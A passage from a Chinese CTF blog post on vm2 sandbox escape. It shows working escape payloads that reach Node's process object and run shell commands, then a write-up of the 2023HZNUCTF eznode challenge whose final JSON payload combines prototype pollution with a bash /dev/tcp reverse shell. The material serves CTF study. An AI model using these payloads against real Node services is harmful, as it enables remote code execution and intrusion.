+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>cli.js:实现vm2的命令行调用
+</span></span><span class=line><span class=cl>contextify.js:封装了三个对象， Contextify 和 Decontextify ，并且针对 global 的Buffer类进行了代理
+</span></span><span class=line><span class=cl>main.js:vm2执行的入口，导出了 NodeVM, VM 这两个沙箱环境，还有一个 VMScript 实际上是封装了 vm.Script
+</span></span><span class=line><span class=cl>sandbox.js:针对 global 的一些函数和变量进行了hook，比如 setTimeout，setInterval 等</span></span></code></pre></td></tr></table></div></div><p>示例代码</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=c1>//从vm2模块导入了两个主要的类：VM和VMScript
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kr>const</span> <span class=p>{</span><span class=nx>VM</span><span class=p>,</span> <span class=nx>VMScript</span><span class=p>}</span> <span class=o>=</span> <span class=nx>require</span><span class=p>(</span><span class=s2>&#34;vm2&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=c1>//使用VMScript创建脚本并在VM中执行
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=k>new</span> <span class=nx>VM</span><span class=p>().</span><span class=nx>run</span><span class=p>(</span><span class=k>new</span> <span class=nx>VMScript</span><span class=p>(</span><span class=s2>&#34;let a = 2;a&#34;</span><span class=p>)));</span></span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=c1>//绕过代码
+</span></span></span><span class=line><span class=cl><span class=c1>// 启用严格模式
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=s2>&#34;use strict&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=c1>// 屏蔽原始的process对象
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kd>var</span> <span class=nx>process</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=c1>// 为所有对象添加了一个 has 方法
+</span></span></span><span class=line><span class=cl><span class=c1>// 当这个新的 has 方法被调用时，它会尝试使用传入的对象 t 的构造函数来创建并返回 process 对象。
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nb>Object</span><span class=p>.</span><span class=nx>prototype</span><span class=p>.</span><span class=nx>has</span> <span class=o>=</span> <span class=kd>function</span> <span class=p>(</span><span class=nx>t</span><span class=p>,</span> <span class=nx>k</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=nx>process</span> <span class=o>=</span> <span class=nx>t</span><span class=p>.</span><span class=nx>constructor</span><span class=p>(</span><span class=s2>&#34;return process&#34;</span><span class=p>)();</span>
+</span></span><span class=line><span class=cl><span class=p>};</span>
+</span></span><span class=line><span class=cl><span class=c1>// 触发原型链污染
+</span></span></span><span class=line><span class=cl><span class=c1>// 这里使用了 in 运算符来检查空字符串 &#34;&#34; 是否为 Buffer.from 的一个属性。
+</span></span></span><span class=line><span class=cl><span class=c1>// 这个检查会触发上面定义的 has 方法（因为 in 运算符在查找属性时会调用内部的[[HasProperty]] 方法，而这在某些情况下可以被 has 方法拦截）
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=s2>&#34;&#34;</span> <span class=k>in</span> <span class=nx>Buffer</span><span class=p>.</span><span class=nx>from</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=nx>process</span><span class=p>.</span><span class=nx>mainModule</span><span class=p>.</span><span class=nx>require</span><span class=p>(</span><span class=s2>&#34;child_process&#34;</span><span class=p>).</span><span class=nx>execSync</span><span class=p>(</span><span class=s2>&#34;whoami&#34;</span><span class=p>).</span><span class=nx>toString</span><span class=p>()</span></span></span></code></pre></td></tr></table></div></div><p>js的三个属性：数据属性、访问器属性、内部属性</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>数据属性和访问器属性都存在 [[Enumerable]] 和 [[Configurable]] 特性
+</span></span><span class=line><span class=cl>Enumerable 特性用于控制属性是否可以被 for...in 循环遍历以及是否可以通过 Object.keys()、Object.values()、Object.entries() 等方法获取到
+</span></span><span class=line><span class=cl>Configurable 特性用于控制属性是否可以被删除或修改。</span></span></code></pre></td></tr></table></div></div><p>数据属性</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>数据属性包含一个可以读取和写入属性值的变量，并且Writable控制这个值是否可改变，默认可改变</span></span></code></pre></td></tr></table></div></div><p>访问器属性</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>访问器属性不包含数据值，而是包含一对 getter 和 setter 函数，默认为 undefined
+</span></span><span class=line><span class=cl>设置对象的访问器属性，也就个get、set属性</span></span></code></pre></td></tr></table></div></div><p>内部属性</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>内部属性是 JavaScript 引擎内部使用的属性，不能直接访问它们
+</span></span><span class=line><span class=cl>例如：Prototype，想要访问Prototype得使用__proto__</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=c1>//绕过代码
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=s2>&#34;use strict&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=c1>//启用严格模式，从vm2库中引入VM类
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kr>const</span> <span class=p>{</span><span class=nx>VM</span><span class=p>}</span> <span class=o>=</span> <span class=nx>require</span><span class=p>(</span><span class=s1>&#39;vm2&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=c1>//屏蔽原有的process对象
+</span></span></span><span class=line><span class=cl><span class=c1>// Object.defineProperty() 是用于在对象上定义一个新属性，或修改已有的属性。
+</span></span></span><span class=line><span class=cl><span class=c1>// 语法：Object.defineProperty(obj, prop, descriptor)
+</span></span></span><span class=line><span class=cl><span class=c1>// 其中，obj 是需要定义属性的对象，
+</span></span></span><span class=line><span class=cl><span class=c1>//		prop 是需要定义或修改的属性名，
+</span></span></span><span class=line><span class=cl><span class=c1>//		descriptor 是一个 JavaScript 对象
+</span></span></span><span class=line><span class=cl><span class=c1>//在Buffer.from(&#34;&#34;)对象上定义一个空字符串属性
+</span></span></span><span class=line><span class=cl><span class=c1>//在Object.prototype上定义一个名为get的属性
+</span></span></span><span class=line><span class=cl><span class=c1>//当访问这个get属性时，它会抛出一个异常，异常是一个函数，该函数能够返回process对象
+</span></span></span><span class=line><span class=cl><span class=c1>//在异常处理中，代码通过e(() =&gt; {})的形式来调用被篡改的Object.prototype.get方法，尝试获取到process对象。
+</span></span></span><span class=line><span class=cl><span class=c1>//在这个过程中，篡改的Object.prototype.get方法会被调用，抛出一个返回process的函数，从而获取到process对象
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kr>const</span> <span class=nx>untrusted</span> <span class=o>=</span> <span class=sb>`var process;
+</span></span></span><span class=line><span class=cl><span class=sb>try{
+</span></span></span><span class=line><span class=cl><span class=sb>    Object.defineProperty(Buffer.from(&#34;&#34;), &#34;&#34;, {get set(){
+</span></span></span><span class=line><span class=cl><span class=sb>        Object.defineProperty(Object.prototype,&#34;get&#34;,{get(){
+</span></span></span><span class=line><span class=cl><span class=sb>            throw x=&gt;x.constructor(&#34;return process&#34;)();
+</span></span></span><span class=line><span class=cl><span class=sb>        }});
+</span></span></span><span class=line><span class=cl><span class=sb>        return ()=&gt;{};
+</span></span></span><span class=line><span class=cl><span class=sb>    }});
+</span></span></span><span class=line><span class=cl><span class=sb>}catch(e){
+</span></span></span><span class=line><span class=cl><span class=sb>    process = e(()=&gt;{});
+</span></span></span><span class=line><span class=cl><span class=sb>}
+</span></span></span><span class=line><span class=cl><span class=sb>process.mainModule.require(&#34;child_process&#34;).execSync(&#34;id&#34;).toString();`</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=k>try</span><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=k>new</span> <span class=nx>VM</span><span class=p>().</span><span class=nx>run</span><span class=p>(</span><span class=nx>untrusted</span><span class=p>));</span>
+</span></span><span class=line><span class=cl><span class=p>}</span><span class=k>catch</span><span class=p>(</span><span class=nx>x</span><span class=p>){</span>
+</span></span><span class=line><span class=cl>    <span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=nx>x</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=p>}</span></span></span></code></pre></td></tr></table></div></div><h3 class=heading-element id=示例题目><span>示例题目</span>
+<a href=#%e7%a4%ba%e4%be%8b%e9%a2%98%e7%9b%ae class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><h4 class=heading-element id=例题-2023hznuctf-eznode><span>例题-2023HZNUCTF eznode</span>
+<a href=#%e4%be%8b%e9%a2%98-2023hznuctf-eznode class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h4><p>用工具扫描，找到源码在app.py中，以下分析关键代码</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=kr>const</span> <span class=nx>backdoor</span> <span class=o>=</span> <span class=kd>function</span> <span class=p>()</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=c1>//需要使用原型链污染来污染空对象的shellcode从而实现RCE
+</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>try</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=k>new</span> <span class=nx>VM</span><span class=p>().</span><span class=nx>run</span><span class=p>({}.</span><span class=nx>shellcode</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>catch</span> <span class=p>(</span><span class=nx>e</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=nx>e</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=nx>app</span><span class=p>.</span><span class=nx>post</span><span class=p>(</span><span class=s1>&#39;/&#39;</span><span class=p>,</span> <span class=kd>function</span> <span class=p>(</span><span class=nx>req</span><span class=p>,</span> <span class=nx>res</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>try</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=nx>req</span><span class=p>.</span><span class=nx>body</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=kd>var</span> <span class=nx>body</span> <span class=o>=</span> <span class=nx>JSON</span><span class=p>.</span><span class=nx>parse</span><span class=p>(</span><span class=nx>JSON</span><span class=p>.</span><span class=nx>stringify</span><span class=p>(</span><span class=nx>req</span><span class=p>.</span><span class=nx>body</span><span class=p>));</span>
+</span></span><span class=line><span class=cl>        <span class=kd>var</span> <span class=nx>copybody</span> <span class=o>=</span> <span class=nx>clone</span><span class=p>(</span><span class=nx>body</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=c1>//copy.body的shit属性为True时才会调用backdoor()
+</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=k>if</span> <span class=p>(</span><span class=nx>copybody</span><span class=p>.</span><span class=nx>shit</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>            <span class=nx>backdoor</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>        <span class=nx>res</span><span class=p>.</span><span class=nx>send</span><span class=p>(</span><span class=s2>&#34;post shit ok&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span><span class=k>catch</span><span class=p>(</span><span class=nx>e</span><span class=p>){</span>
+</span></span><span class=line><span class=cl>        <span class=nx>res</span><span class=p>.</span><span class=nx>send</span><span class=p>(</span><span class=s2>&#34;is it shit ?&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=nx>e</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>})</span></span></span></code></pre></td></tr></table></div></div><p>存在Nodejs原型链污染和VM2沙箱逃逸</p><p>最后生成的payload如下，把ip和port改成自己的vps弹shell即可</p><ul><li><p>let res = import(&rsquo;./app.js&rsquo;);会返回一个Promise对象</p></li><li><p>任何对象的 <code>toString</code> 方法都是从 <code>Function</code> 对象继承而来的。</p></li><li><p><code>Function</code> 对象的 <code>constructor</code> 属性引用了 <code>Function</code> 构造函数本身</p></li><li><p>res.toString.constructor(&ldquo;return this&rdquo;)()返回了全局上下文global，从而获得了全局上下文的引用，可以进一步访问process</p></li></ul><json-viewer value='"{\n    \"shit\": 1,\n    \"__proto__\": {\n        \"shellcode\": \"let res = import(&#39;./app.js&#39;); res.toString.constructor(\\\"return this\\\") ().process.mainModule.require(\\\"child_process\\\").execSync(&#39;bash -c \\\"bash -i \u003e\u0026 /dev/tcp/ip/port 0\u003e\u00261\\\"&#39;).toString();\"\n    }\n}\n//也可以使用下面这个\n{\n    \"shit\": 1,\n    \"__proto__\": {\n        \"shellcode\": \"let res = import(&#39;./app.js&#39;); res.toString.constructor(\\\"return process\\\") ().mainModule.require(\\\"child_process\\\").execSync(&#39;bash -c \\\"bash -i \u003e\u0026 /dev/tcp/ip/port 0\u003e\u00261\\\"&#39;).toString();\"\n    }\n}"' expand-depth=1 boxed copyable='{"copiedText":"已复制","copyText":"复制"}'></json-viewer></div><div class=post-footer id=post-footer><div class=post-info><div class=post-info-line><div class=post-info-mod><span title="更新于 2023-08-22 22:34:46">更新于 2023-08-22&nbsp;</span></div></div><div class=post-info-line><div class=post-info-md><span><a href=/posts/442fd1d/index.md title=阅读原始文档 class=link-to-markdown>阅读原始文档</a></span></div><div class=post-info-share><span><a href=javascript:void(0); title="分享到 X" data-sharer=twitter data-url=https://goodlunatic.github.io/posts/442fd1d/ data-title=MIsc-沙箱逃逸 data-hashtags=Misc,CTF><i class="fa-brands fa-x-twitter fa-fw" aria-hidden=true></i></a>
+<a href=javascript:void(0); title="分享到 Facebook" data-sharer=facebook data-url=https://goodlunatic.github.io/posts/442fd1d/ data-hashtag=Misc><i class="fa-brands fa-facebook-square fa-fw" aria-hidden=true></i></a>
+<a href=javascript:void(0); title="分享到 微博" data-sharer=weibo data-url=https://goodlunatic.github.io/posts/442fd1d/ data-title=MIsc-沙箱逃逸><i class="fa-brands fa-weibo fa-fw" aria-hidden=true></i></a></span></div></div></div><div class=post-info-more><section class=post-tags><i class="fa-solid fa-tags fa-fw me-1" aria-hidden=true></i><a href=/tags/misc/ class=post-tag title="标签 - Misc">Misc</a><a href=/tags/ctf/ class=post-tag title="标签 - CTF">CTF</a></section><section><span><a href=javascript:void(0); onclick=window.history.back()>返回</a></span>&nbsp;|&nbsp;<span><a href=/>主页</a></span></section></div><div class=post-nav><a href=/posts/5e91e89/ class=post-nav-item rel=prev title=CTF-Pwn学习记录><i class="fa-solid fa-angle-left fa-fw" aria-hidden=true></i>CTF-Pwn学习记录</a><a href=/posts/940b876/ class=post-nav-item rel=next title="2023 羊城杯网络安全大赛 Misc Writeup">2023 羊城杯网络安全大赛 Misc Writeup<i class="fa-solid fa-angle-right fa-fw" aria-hidden=true></i></a></div></div></article><aside class=toc id=toc-auto aria-label=目录><h2 class=toc-title>目录&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden=true></i></h2><div class=toc-content id=toc-content-auto></div></aside></main><footer class=footer><div class=footer-container><div class="footer-line powered order-1">由 <a href=https://gohugo.io/ target=_blank rel="external nofollow noopener noreferrer" title="Hugo 0.152.1">Hugo</a> 强力驱动 | 主题 - <a href=https://github.com/hugo-fixit/FixIt target=_blank rel=external title="FixIt v0.4.0-alpha.2-20251023040336-063af2cd">FixIt</a></div><div class="footer-line copyright order-2" itemscope itemtype=http://schema.org/CreativeWork><i class="fa-regular fa-copyright fa-fw" aria-hidden=true></i>
+<span itemprop=copyrightYear>2022 - 2025</span><span class=author itemprop=copyrightHolder>
+<a href=https://goodlunatic.github.io target=_blank rel="external nofollow noopener noreferrer">Lunatic</a></span></div><div class="footer-line visitor"><span id=busuanzi_container_site_uv title=总访客数><i class="fa-regular fa-user fa-fw me-1" aria-hidden=true></i><span id=busuanzi_value_site_uv><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden=true></i></span></span><span id=busuanzi_container_site_pv class=footer-divider title=总访问量><i class="fa-regular fa-eye fa-fw me-1" aria-hidden=true></i><span id=busuanzi_value_site_pv><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden=true></i></span></span></div></div></footer></div><div class=widgets><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role=button aria-label=回到顶部><i class="fa-solid fa-arrow-up fa-fw" aria-hidden=true></i><span class=variant-numeric>0%</span></div></div><a href=https://github.com/goodlunatic title="Visit Lunatic's Github" target=_blank rel="external nofollow" class="github-corner left d-none-mobile"><svg viewBox="0 0 250 250" aria-hidden="true" width="56" height="56"><path d="M0 0 115 115h15l12 27L250 250V0z"/><path d="M128.3 109C113.8 99.7 119 89.6 119 89.6 122 82.7 120.5 78.6 120.5 78.6 119.2 72 123.4 76.3 123.4 76.3 127.3 80.9 125.5 87.3 125.5 87.3 122.9 97.6 130.6 101.9 134.4 103.2" fill="currentColor" style="transform-origin:130px 106px" class="octo-arm"/><path d="M115 115C114.9 115.1 118.7 116.5 119.8 115.4l13.9-13.8C136.9 99.2 139.9 98.4 142.2 98.6 133.8 88 127.5 74.4 143.8 58 148.5 53.4 154 51.2 159.7 51 160.3 49.4 163.2 43.6 171.4 40.1 171.4 40.1 176.1 42.5 178.8 56.2 183.1 58.6 187.2 61.8 190.9 65.4 194.5 69 197.7 73.2 200.1 77.6 213.8 80.2 216.3 84.9 216.3 84.9 212.7 93.1 206.9 96 205.4 96.6 205.1 102.4 203 107.8 198.3 112.5 181.9 128.9 168.3 122.5 157.7 114.1 157.9 116.9 156.7 120.9 152.7 124.9L141 136.5C139.8 137.7 141.6 141.9 141.8 141.8z" fill="currentColor" class="octo-body"/></svg></a><div id=mask></div><noscript><div class=noscript-warning>该网站在启用 JavaScript 的情况下效果最佳。</div></noscript></div><link rel=stylesheet href=/lib/pace/themes/blue/pace-theme-minimal.css><script src=/lib/autocomplete/autocomplete.min.js defer></script><script src=/lib/fuse/fuse.min.js defer></script><script src=/lib/json-viewer-element/json-viewer-element.umd.js defer></script><script src=/lib/sharer/sharer.min.js async defer></script><script src=/lib/cell-watermark/watermark.min.js defer></script><script src=https://vercount.one/js async defer></script><script src=/lib/pace/pace.min.js async defer></script><script src=/posts/442fd1d/config/page.js defer></script><script src=/js/theme.min.js defer></script></body></html>
